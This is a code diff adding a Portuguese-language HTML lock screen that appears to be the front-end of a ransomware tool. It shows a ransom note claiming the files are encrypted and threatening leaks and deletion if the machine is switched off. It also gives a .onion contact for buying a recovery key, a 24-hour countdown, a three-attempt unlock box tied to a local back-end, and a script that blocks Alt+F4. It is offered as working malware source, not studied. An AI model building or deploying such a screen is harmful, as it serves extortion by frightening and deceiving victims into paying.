@@ -1,0 +1,254 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+<meta charset="UTF-8">
+
+<style>
+body {
+    margin: 0;
+    background: black;
+    color: white;
+    font-family: Consolas, monospace;
+    overflow: hidden;
+}
+
+/* máscara esquerda */
+.mask {
+    position: absolute;
+    left: 80px;
+    top: 50%;
+    transform: translateY(-50%);
+}
+
+.mask img {
+    width: 150px;
+    opacity: 0.9;
+    filter: grayscale(100%) contrast(120%);
+}
+
+/* timer */
+.timer {
+    position: absolute;
+    left: 80px;
+    bottom: 180px;
+    font-size: 28px;
+}
+
+.texto-direita {
+    position: absolute;
+    top: -62%;
+    left: -305%; /* 👈 É ISSO AQUI */
+}
+
+.bar {
+    position: absolute;
+    left: 80px;
+    bottom: 140px;
+    width: 250px;
+    height: 8px;
+    border: 1px solid white;
+}
+
+.bar-inner {
+    height: 100%;
+    width: 0%;
+    background: white;
+    transition: width 1s linear;
+}
+
+/* centro */
+.center {
+    position: absolute;
+    top: 35%;
+    left: 60%;
+    transform: translate(-50%, -50%);
+    text-align: center;
+}
+
+/* 🔥 container do ícone + texto */
+.alerta-box {
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    gap: 10px;
+    margin-bottom: 10px;
+}
+
+/* ícone */
+.alerta {
+    width: 35px;
+    height: auto;
+}
+
+/* texto do lado */
+.alerta-texto {
+    font-size: 20px;
+    font-weight: bold;
+    color: white;
+}
+
+input {
+    width: 300px;
+    padding: 8px;
+    background: black;
+    border: 1px solid white;
+    color: white;
+    text-align: center;
+}
+
+button {
+    margin-top: 10px;
+    padding: 8px;
+    width: 200px;
+    background: white;
+    color: black;
+    border: none;
+    cursor: pointer;
+}
+
+/* terminal */
+.logs {
+    position: absolute;
+    top: 58%;
+    left: 55%;
+    transform: translate(-50%, 0);
+    width: 650px;
+    height: 260px;
+    border: 1px solid white;
+    padding: 10px;
+    font-size: 12px;
+    overflow: hidden;
+    white-space: pre-line;
+}
+</style>
+</head>
+
+<body>
+
+<div class="mask">
+    <img src="https://i.imgur.com/7LPOR0j.jpeg">
+</div>
+
+<div class="timer" id="timer">23:59:59</div>
+
+<div class="bar">
+    <div class="bar-inner" id="bar"></div>
+</div>
+
+<div class="center">
+
+    <div class="alerta-box">
+        <img src="https://i.imgur.com/I0KJ5qo.png" class="alerta">
+        <span class="alerta-texto"></span>
+    </div>
+
+
+<p class="texto-direita">
+    Seus Dados foram Encryptados, se desligar o computador todos seus dados, logins e senhas serão vazados e excluidos permanentemente<br>
+   junto com seu sistema. A unica forma de recuperar seus arquivos e comprando uma chave de recuperação (KEY)<br>
+Você pode comprar uma chave de recuperação enviando um email para: resgateseucomputador.onion.br
+</p>
+
+
+
+    <p>All your files have been encrypted</p>
+    <p>Digite a senha para liberar o acesso</p>
+
+    <input type="text" id="senha">
+    <br>
+
+    <button id="botao" onclick="login()">DESBLOQUEAR</button>
+
+    <div id="tentativas" data-t="3">Tentativas restantes: 3</div>
+</div>
+
+<div class="logs" id="logs"></div>
+
+<script>
+let tempo = 86400;
+
+function atualizarTimer() {
+    let h = Math.floor(tempo / 3600);
+    let m = Math.floor((tempo % 3600) / 60);
+    let s = tempo % 60;
+
+    document.getElementById("timer").innerText =
+        String(h).padStart(2,'0') + ":" +
+        String(m).padStart(2,'0') + ":" +
+        String(s).padStart(2,'0');
+
+    document.querySelector(".bar-inner").style.width =
+        ((86400 - tempo) / 86400 * 100) + "%";
+
+    if (tempo > 0) tempo--;
+}
+setInterval(atualizarTimer, 1000);
+
+/* ---------- ponte back-end ---------- */
+const API = window.pywebview?.api;   // dentro do pywebview
+const LOCAL = !API;                 // execução Flask
+
+async function post(url, body={}) {
+  const r = await fetch(url, {
+      method:'POST',
+      headers:{'Content-Type':'application/json'},
+      body: JSON.stringify(body)
+  });
+  return r.json();
+}
+
+/* ---------- login real ---------- */
+async function login(){
+    const senha = document.getElementById('senha').value.trim();
+    if(!senha){ alert('Digite a senha'); return; }
+
+    const botao = document.getElementById('botao');
+    botao.disabled = true;
+    botao.innerText = 'Aguarde…';
+
+    try{
+        const res = LOCAL
+                    ? await post('/unlock', {senha})
+                    : await API.verificar(senha);
+
+        if(res.status === 'ok'){
+            document.getElementById('bar').style.width = '100%';
+            document.getElementById('tentativas').innerText = 'Acesso liberado!';
+            setTimeout(() => {
+                if(LOCAL) post('/close');
+                else window.close();
+            }, 1500);
+        }else{
+            // senha errada
+            let t = parseInt(document.getElementById('tentativas').dataset.t);
+            t--;
+            document.getElementById('tentativas').dataset.t = String(t);
+            document.getElementById('tentativas').innerText = `Tentativas restantes: ${t}`;
+            if(t === 0) botao.style.display = 'none';
+        }
+    }catch(e){
+        alert('Erro ao comunicar com back-end');
+    }finally{
+        botao.disabled = false;
+        botao.innerText = 'DESBLOQUEAR';
+    }
+}
+
+/* ---------- atualiza barra e logs reais ---------- */
+async function pollStatus(){
+    if(!LOCAL) return;
+    const st = await fetch('/status').then(r => r.json());
+    document.getElementById('bar').style.width = st.pct + '%';
+    document.getElementById('logs').innerHTML = st.logs.map(l => l + '\n').join('');
+    document.getElementById('logs').scrollTop = 1e9;
+}
+if(LOCAL) setInterval(pollStatus, 500);
+
+/* bloqueia Alt+F4 */
+document.addEventListener('keydown', e => {
+    if(e.altKey && e.key === 'F4') e.preventDefault();
+});
+</script>
+
+</body>
+</html>
